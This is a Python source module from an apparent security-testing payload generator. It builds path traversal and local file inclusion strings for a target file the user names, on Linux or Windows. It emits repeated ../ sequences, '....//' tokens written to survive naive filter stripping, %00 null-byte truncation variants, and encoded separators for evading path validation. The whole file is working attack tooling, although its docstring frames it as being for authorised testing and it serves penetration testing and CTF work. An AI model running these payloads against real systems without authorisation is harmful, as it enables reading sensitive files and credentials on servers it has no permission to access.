"""Path Traversal / Local File Inclusion module (highest priority).

Generates traversal and direct-path variants for a user-specified target file on
Linux or Windows. Relative variants are derived carefully from the requested
(possibly absolute) path -- the leading separator/drive is stripped before a
``../`` prefix is applied, so payloads are never malformed by blind
concatenation.

POAD does not claim these universally bypass path validation; they are a
structured set of common variants for *authorised* testing.
"""

from __future__ import annotations

import re
from typing import Any

from poad.core.generator import Unit
from poad.core.validation import ValidationError, validate_depth, validate_nonempty
from poad.modules.base import BaseModule, BuildOutput, ModuleError, Option, register

# Transforms that are meaningful for traversal payloads. Full-body URL encoding
# is intentionally excluded: for file-read traversal the separator-focused
# variants are what matters, and whole-string encoding would also corrupt any
# literal suffix such as %00.
_SEPARATOR_TRANSFORMS = ("url_sep", "url_sep_upper", "double_url_sep")
_SEPARATOR_TRANSFORMS_EXT = _SEPARATOR_TRANSFORMS + ("overlong_utf8_sep",)

_FAMILIES = (
    "direct",        # the path as given (absolute) and stripped (relative)
    "traversal",     # ../ (or ..\) repeated 1..depth
    "normalization", # ....// style tokens that survive one round of ../ stripping
)


def _segments(path: str) -> list[str]:
    """Split a path into clean segments, dropping any drive letter/leading sep."""
    p = path.replace("\\", "/")
    p = re.sub(r"^[A-Za-z]:", "", p)  # strip Windows drive (C:)
    return [s for s in p.split("/") if s not in ("", ".")]


class LFIModule(BaseModule):
    key = "lfi"
    aliases = ("path-traversal", "pathtraversal", "traversal")
    title = "Path Traversal / LFI"
    summary = "Local file inclusion & directory traversal variants (Linux/Windows)."

    def options(self) -> list[Option]:
        return [
            Option("file", "Target file to read (e.g. /flag/flag.txt)",
                   required=True, prompt="Target file"),
            Option("os", "Target operating system", type="choice",
                   choices=("linux", "windows"), default="linux",
                   prompt="Target OS"),
            Option("depth", "Maximum traversal depth", type="int", default=8,
                   prompt="Maximum traversal depth"),
            Option("families", "Payload families to include", type="multichoice",
                   choices=_FAMILIES, default=list(_FAMILIES),
                   prompt="Payload families"),
            Option("prefix", "Literal string prepended to every payload", default="",
                   prompt="Path prefix (optional)"),
            Option("suffix", "Literal string appended to every payload", default="",
                   prompt="Path suffix (optional)"),
            Option("null_byte", "Add %00 null-byte suffix variants (legacy PHP)",
                   type="flag", default=False),
            Option("cross_platform",
                   "Also emit the other OS's separator variants", type="flag",
                   default=False),
        ]

    def build(self, ctx: dict[str, Any], library) -> BuildOutput:
        ctx = self.apply_defaults(ctx)
        self.require(ctx, "file")

        target = validate_nonempty(str(ctx["file"]), field="Target file")
        os_name = str(ctx.get("os", "linux")).lower()
        if os_name not in ("linux", "windows"):
            raise ModuleError("os must be 'linux' or 'windows'")
        try:
            depth = validate_depth(int(ctx.get("depth", 8)))
        except (TypeError, ValueError) as exc:
            raise ModuleError(f"Invalid depth: {exc}") from exc

        families = ctx.get("families") or list(_FAMILIES)
        if isinstance(families, str):
            families = [f.strip() for f in families.split(",") if f.strip()]
        bad = [f for f in families if f not in _FAMILIES]
        if bad:
            raise ModuleError(f"Unknown LFI family/families: {', '.join(bad)}")

        prefix = str(ctx.get("prefix") or "")
        suffix = str(ctx.get("suffix") or "")
        null_byte = bool(ctx.get("null_byte", False))
        cross = bool(ctx.get("cross_platform", False))

        segments = _segments(target)
        if not segments:
            raise ModuleError("Target file has no path segments after normalisation")

        warnings: list[str] = []
        notes: list[str] = []
        units: list[Unit] = []

        # Decide which separator layouts to emit.
        layouts: list[str] = [os_name]
        if cross:
            layouts.append("windows" if os_name == "linux" else "linux")

        drive_match = re.match(r"^([A-Za-z]:)", target.replace("/", "\\"))
        drive = drive_match.group(1) if drive_match else ""

        for layout in layouts:
            units.extend(
                self._units_for_layout(
                    layout, segments, drive, depth, families, prefix, suffix, null_byte
                )
            )

        if null_byte:
            notes.append(
                "Null-byte (%00) variants only affect legacy/unpatched interpreters "
                "(e.g. PHP < 5.3.4). Marked version-dependent."
            )
        notes.append(
            "Whether a traversal payload works depends on the target application's "
            "path handling. POAD makes no bypass guarantees."
        )

        info = {
            "Category": "Path Traversal / LFI",
            "Target file": target,
            "OS": os_name + (" (+cross-platform)" if cross else ""),
            "Depth": depth,
            "Families": ", ".join(families),
        }
        return BuildOutput(units=units, info=info, warnings=warnings, notes=notes)

    # -- internal -------------------------------------------------------

    def _units_for_layout(
        self, layout, segments, drive, depth, families, prefix, suffix, null_byte
    ) -> list[Unit]:
        sep = "\\" if layout == "windows" else "/"
        rel = sep.join(segments)
        units: list[Unit] = []

        def add(base: str, family: str, note: str | None = None, *, legacy: bool = False) -> None:
            value = f"{prefix}{base}{suffix}"
            units.append(
                Unit(
                    value=value,
                    transforms=_SEPARATOR_TRANSFORMS,
                    family=f"{family}:{layout}",
                    template_id=f"lfi-{layout}-{family}",
                    note=note,
                )
            )
            if null_byte:
                units.append(
                    Unit(
                        value=f"{prefix}{base}%00{suffix}",
                        transforms=_SEPARATOR_TRANSFORMS,
                        family=f"{family}:{layout}:nullbyte",
                        template_id=f"lfi-{layout}-{family}-null",
                        note="legacy null-byte truncation",
                    )
                )

        if "direct" in families:
            # Absolute form (as the OS would address it).
            if layout == "linux":
                abs_form = sep + rel
            else:  # windows: preserve a drive letter if the user supplied one
                abs_form = (drive + "\\" + rel) if drive else "\\" + rel
            add(abs_form, "direct-absolute")
            # Relative form (leading separator/drive stripped).
            add(rel, "direct-relative")

        if "traversal" in families:
            token = ".." + sep
            for n in range(1, depth + 1):
                add(token * n + rel, f"traversal-{n}")

        if "normalization" in families:
            # ....// collapses to ../ after a naive single ../ removal.
            dotdot = "...." + sep + sep
            for n in range(1, depth + 1):
                add(dotdot * n + rel, f"normalization-{n}",
                    note="survives one round of ../ stripping")
            # Leading ./ no-op prefix sometimes defeats naive blacklists.
            add("." + sep + (".." + sep) * max(1, depth // 2) + rel, "normalization-dotslash")

        return units


register(LFIModule())
